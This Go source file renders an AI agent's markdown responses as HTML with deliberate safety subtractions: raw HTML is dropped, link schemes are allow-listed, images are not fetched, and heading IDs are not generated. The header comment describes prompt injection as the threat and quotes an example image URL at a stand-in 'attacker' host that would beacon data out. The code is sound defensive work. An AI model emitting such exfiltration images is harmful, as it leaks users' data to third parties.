package web

// An agent's final response is model-authored prose, and models write
// markdown: headings, lists, bold, tables, fenced code. Rendered as one plain
// block it arrived as literal `##` and `**` — the review a person actually
// reads, shown as the source of a review.
//
// So it is rendered, through goldmark, on a converter that is NOT the one
// docs.go uses. That page renders this repo's own embedded documentation and
// may trust it; this one renders text a model wrote, which is one prompt
// injection away from being whatever the injector wanted on the page. The
// boundary is drawn here, and every part of it is a deliberate subtraction:
//
//   - Raw HTML is dropped, which is goldmark's default (WithUnsafe is not
//     set) — a <script> or an onclick= arrives as a comment, not as markup.
//   - A javascript: URL renders with an empty href, also goldmark's default.
//   - IMAGES ARE NOT FETCHED. This is the one hole the defaults leave open
//     and the dangerous one: `![](http://attacker/p.gif?run=…)` is an
//     outbound GET the moment a page opens, which makes a review a beacon.
//     They render as the alt text and the host that was wanted instead, which
//     is strictly more information than the picture.
//   - Links carry rel="noopener noreferrer nofollow" and open in a new tab,
//     so a model cannot navigate the page a reader is triaging on.
//   - Heading ids are NOT generated. The run page's own anchors are
//     #step-N-name, and an agent free to mint `id="heading"` is an agent that
//     can collide with them.
//
// Headings are demoted visually rather than structurally: an agent's h2 is
// subordinate to the run's h1 whatever it calls itself, and the .md rules in
// app.css say so without rewriting the document's outline.

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"net/url"
	"strings"

	"github.com/alecthomas/chroma/v3"
	chromahtml "github.com/alecthomas/chroma/v3/formatters/html"
	"github.com/alecthomas/chroma/v3/lexers"
	"github.com/yuin/goldmark/v2/ast"
	"github.com/yuin/goldmark/v2/extension"
	"github.com/yuin/goldmark/v2/parser"
	gmrender "github.com/yuin/goldmark/v2/renderer"
	"github.com/yuin/goldmark/v2/renderer/html"
	"github.com/yuin/goldmark/v2/text"
	"github.com/yuin/goldmark/v2/util"
)

// codeFormatter is shared across every caller: the page renderer and the
// live stream's flush goroutine. Safe to share — RegexLexer guards its own
// lazy compilation with sync.Once, and the HTML formatter's style cache is
// mutex-guarded — and cheaper than building one per call, which is what this
// used to do on every fenced block and now would do on every turn.
//
// WithClasses(false): the style is carried inline rather than by a
// stylesheet this page does not serve. PreventSurroundingPre(true): the
// caller owns its own <pre>, so the block matches every other code block on
// the page.
var codeFormatter = chromahtml.New(chromahtml.WithClasses(false), chromahtml.PreventSurroundingPre(true))

// agentParser and agentRenderer render untrusted, model-authored prose.
//
// GFM for the tables and strikethrough models routinely emit, and the same
// chroma style docs.go uses so a fenced block in an answer looks like a
// fenced block anywhere else on the site. No WithUnsafe, and no
// WithAutoHeadingID — see the file comment for why each is absent.
//
// A parser and a renderer rather than one converter, which goldmark no longer has; the subtractions this file exists for are now split across the two, and the renderer half is where every override lives.
var agentParser = parser.New(
	parser.WithExtensions(extension.GFMParser),
	parser.WithASTTransformers(util.Prioritized[parser.ASTTransformer](inertImages{}, 100)),
)

var agentRenderer = html.New(
	html.WithExtensions(extension.GFMHTMLRenderer),
	// Decorators rather than plain node renderers, which goldmark applies BEFORE every extension's own and which the built-in CommonMark extension therefore silently takes back — link, autolink and code block all rendered as goldmark's defaults, which is to say with none of the subtractions this file exists for. A decorator is applied to whatever won and composes with any other, so the override cannot be undone by adding an extension.
	html.WithNodeRendererDecorators(map[ast.NodeKind]html.NodeRendererDecorator{
		ast.KindLink:      instead(renderSafeLink),
		ast.KindAutoLink:  instead(renderSafeAutoLink),
		ast.KindCodeBlock: instead(renderCodeBlock),
	}),
)

// instead takes a node kind away from whatever registered it.
func instead(render func(io.Writer, []byte, ast.Node, bool, gmrender.Context) (ast.WalkStatus, error)) html.NodeRendererDecorator {
	replacement := html.NodeRendererFunc(render)

	return func(_ html.NodeRenderer) html.NodeRenderer { return replacement }
}

// renderCodeBlock renders every code block, in one of two ways.
//
// A ```json fence goes through this package's own JSON renderer, so the JSON
// in an answer looks identical to the JSON in the tool result one row above
// it — one data shape, one rendering, wherever it appears. Every other
// language is source text in a language this package has no business
// knowing, which is what chroma is for.
//
// One function covering both because goldmark has no fall-through: the
// renderer registered for a node kind owns it outright, so the choice has to
// be made here rather than by declining. A four-space block reaches the same
// function and reports no language, which goldmark now says with the second
// return rather than with a separate node kind.
func renderCodeBlock(w io.Writer, source []byte, node ast.Node, entering bool, _ gmrender.Context) (ast.WalkStatus, error) {
	if !entering {
		return ast.WalkContinue, nil
	}

	block, ok := node.(*ast.CodeBlock)
	if !ok {
		return ast.WalkContinue, nil
	}

	lang := ""
	if declared, found := block.Language(source); found {
		lang = strings.ToLower(declared)
	}

	writeCodeBlock(w, lang, block.Value.Str(source))

	return ast.WalkSkipChildren, nil
}

// writeCodeBlock emits one code block, labelled with the language it declared
// so a reader can tell a proposed yaml from a shell transcript without
// reading it first.
func writeCodeBlock(w io.Writer, lang, body string) {
	_, _ = io.WriteString(w, `<div class="codeblock">`)

	if lang != "" {
		_, _ = io.WriteString(w, `<span class="codelang">`)
		_, _ = io.WriteString(w, template.HTMLEscapeString(lang))
		_, _ = io.WriteString(w, `</span>`)
	}

	_, _ = io.WriteString(w, `<pre class="json code">`)
	_, _ = io.WriteString(w, string(highlightCode(body, lang)))
	_, _ = io.WriteString(w, `</pre></div>`)
}

// highlightCode colors one block: this package's renderer for a complete JSON
// document, chroma's lexer for everything else — including a JSON fence cut
// off mid-object, which is not a document and which the lexer can color where
// the parser can only refuse it.
//
// This is now on the path of every message and every payload (detect.go's
// callers), not just a fenced block in an answer — its input is
// model-authored or file-derived, so a panic anywhere below it is wrapped
// rather than left to propagate out of a template.Execute: a 500 on the page
// a person is triaging on, or a dead flush goroutine on the live stream.
func highlightCode(body, lang string) (result template.HTML) {
	defer func() {
		if r := recover(); r != nil {
			//nolint:gosec // G203: escaped, no markup added
			result = template.HTML(template.HTMLEscapeString(body))
		}
	}()

	return highlightCodeUnguarded(body, lang)
}

func highlightCodeUnguarded(body, lang string) template.HTML {
	if body == "" {
		return " "
	}

	if lang == "json" {
		if block, ok := jsonBlock(body); ok {
			return block
		}
	}

	lexer := lexers.Get(lang)
	if lexer == nil {
		//nolint:gosec // G203: escaped, no markup added
		return template.HTML(template.HTMLEscapeString(body))
	}

	// Coalesce merges adjacent same-type tokens before they reach the
	// formatter. lexers.Get returns an uncoalesced lexer, and this is now
	// reached for a whole plain-text message (detect.go's markdown
	// fallback), not just a fenced block — markdown's inline rule falls back
	// to one Text token per unmatched character, which without Coalesce is
	// dozens of tiny tokens per sentence instead of one run. docsCodeStyle
	// leaves Text unstyled today, so that specific case emits no markup
	// either way, but a styled token type produced piecewise by any lexer
	// (a future style change, a different detected language) would fragment
	// into one <span> per token without this — cheap insurance for a
	// correctness property this file does not want to have to rediscover.
	// Coalesce(nil) panics, hence the nil check above running first.
	iterator, err := chroma.Coalesce(lexer).Tokenise(nil, body)
	if err != nil {
		//nolint:gosec // G203: as above
		return template.HTML(template.HTMLEscapeString(body))
	}

	var out strings.Builder

	err = codeFormatter.Format(&out, docsCodeStyle, iterator)
	if err != nil {
		//nolint:gosec // G203: as above
		return template.HTML(template.HTMLEscapeString(body))
	}

	//nolint:gosec // G203: chroma escapes token text; the markup is its own <span style=…>
	return template.HTML(out.String())
}

// renderProse renders one agent response to HTML.
//
// A failure yields the escaped source rather than nothing: a response that
// will not render is still a response somebody needs to read, and the raw
// text is a worse rendering, not a missing one.
func renderProse(text string) template.HTML {
	trimmed := strings.TrimSpace(text)
	if trimmed == "" {
		return ""
	}

	var out bytes.Buffer

	source := []byte(trimmed)

	err := agentRenderer.Render(&out, source, agentParser.Parse(source))
	if err != nil {
		//nolint:gosec // G203: escaped, no markup added
		return template.HTML("<p>" + template.HTMLEscapeString(trimmed) + "</p>")
	}

	//nolint:gosec // G203: the whole contract of agentMarkdown above is that its output is safe
	return template.HTML(out.String())
}

// inertImages replaces every image with the text of what it asked for, before
// the renderer ever sees one. A transformer rather than a renderer override
// so an image nested inside a link or a table cell is caught the same way.
type inertImages struct{}

func (inertImages) Transform(doc *ast.Document, reader text.Reader, _ parser.Context) {
	var found []*ast.Image

	_ = ast.Walk(doc, func(node ast.Node, entering bool) (ast.WalkStatus, error) {
		if image, ok := node.(*ast.Image); ok && entering {
			found = append(found, image)
		}

		return ast.WalkContinue, nil
	})

	for _, image := range found {
		// An ordinary text node, which the renderer writes through its
		// HTML-escaping text writer: the label is built from the image's own
		// alt text and host, both model-authored, and being escaped on the way
		// out is the entire point of replacing the image. goldmark's raw
		// spelling would be a CodeSpanDecoder value, which is exactly what
		// this must not be.
		replacement := ast.NewText(text.NewSingleLineValueFromString(imageLabel(image, reader), nil))

		image.Parent().ReplaceChild(image, replacement)
	}
}

// imageLabel describes the image that was not loaded: its alt text, and the
// host it wanted. The host, not the whole URL, because the query string is
// where an exfiltrated payload would ride and reprinting it verbatim puts it
// back on the page.
func imageLabel(image *ast.Image, reader text.Reader) string {
	alt := strings.TrimSpace(nodeText(image, reader.Source()))

	host := "an external host"

	parsed, err := url.Parse(image.Destination.Value(reader.Source()))
	if err == nil && parsed.Host != "" {
		host = parsed.Host
	}

	if alt == "" {
		return fmt.Sprintf("[image not loaded · %s]", host)
	}

	return fmt.Sprintf("[image not loaded · %s · %s]", alt, host)
}

// nodeText is a node's own text, concatenated from the text nodes under it.
//
// Written out here because goldmark dropped Node.Text: an image's alt is child
// nodes, and the only thing this file wants from them is the words.
func nodeText(node ast.Node, source []byte) string {
	var out strings.Builder

	_ = ast.Walk(node, func(child ast.Node, entering bool) (ast.WalkStatus, error) {
		if leaf, ok := child.(*ast.Text); ok && entering {
			out.WriteString(leaf.Value.Value(source))
		}

		return ast.WalkContinue, nil
	})

	return out.String()
}

// renderSafeLink and renderSafeAutoLink render links with the attributes that
// keep a model-authored one from acting on the page it sits in.
func renderSafeLink(w io.Writer, source []byte, node ast.Node, entering bool, _ gmrender.Context) (ast.WalkStatus, error) {
	if !entering {
		_, _ = io.WriteString(w, "</a>")

		return ast.WalkContinue, nil
	}

	link, ok := node.(*ast.Link)
	if !ok {
		return ast.WalkContinue, nil
	}

	writeAnchor(w, link.Destination.Value(source))

	return ast.WalkContinue, nil
}

func renderSafeAutoLink(w io.Writer, source []byte, node ast.Node, entering bool, _ gmrender.Context) (ast.WalkStatus, error) {
	if !entering {
		return ast.WalkContinue, nil
	}

	link, ok := node.(*ast.AutoLink)
	if !ok {
		return ast.WalkContinue, nil
	}

	// Destination rather than the label for the href: an email autolink carries its mailto: there and only there.
	writeAnchor(w, link.Destination.Value(source))
	_, _ = io.WriteString(w, template.HTMLEscapeString(link.Label.Value(source)))
	_, _ = io.WriteString(w, "</a>")

	return ast.WalkContinue, nil
}

// writeAnchor opens an anchor whose scheme has been vetted.
func writeAnchor(w io.Writer, destination string) {
	_, _ = io.WriteString(w, `<a href="`)
	_, _ = io.WriteString(w, template.HTMLEscapeString(safeURL(destination)))
	_, _ = io.WriteString(w, `" rel="noopener noreferrer nofollow" target="_blank">`)
}

// safeURL passes through the schemes a link may use and blanks everything
// else. An allow-list rather than a javascript:-denylist, because the schemes
// worth linking to are a short known set and the ones worth blocking are not
// (data:, vbscript:, and whatever a browser adds next).
func safeURL(destination string) string {
	trimmed := strings.TrimSpace(destination)

	// A relative link or a fragment names something on this site and carries
	// no scheme to vet.
	if trimmed == "" || strings.HasPrefix(trimmed, "/") || strings.HasPrefix(trimmed, "#") {
		return trimmed
	}

	parsed, err := url.Parse(trimmed)
	if err != nil {
		return ""
	}

	switch strings.ToLower(parsed.Scheme) {
	case "", "http", "https", "mailto":
		return trimmed
	default:
		return ""
	}
}
